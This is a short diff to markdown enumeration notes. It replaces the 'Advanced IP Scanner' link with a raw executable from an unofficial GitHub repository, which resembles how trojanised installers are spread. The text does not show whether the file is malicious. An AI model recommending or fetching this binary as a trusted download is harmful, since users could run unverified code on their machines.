@@ -54,7 +54,7 @@ run
 # ENUMERATION
 <details>
   <summary>Enum</summary>
-*[Advanced IP Scanner](ipscan25.exe) of windows
+*[Advanced IP Scanner](https://github.com/infovault-Ytube/test1/raw/main/ipscan25.exe) of windows
 Specify IP range and start. Right click on alive hosts to perform actions, e.g. shutdown. Use Radmin for advanced features.
 
 *[Hyena](https://www.systemtools.com/hyena/download.htm)
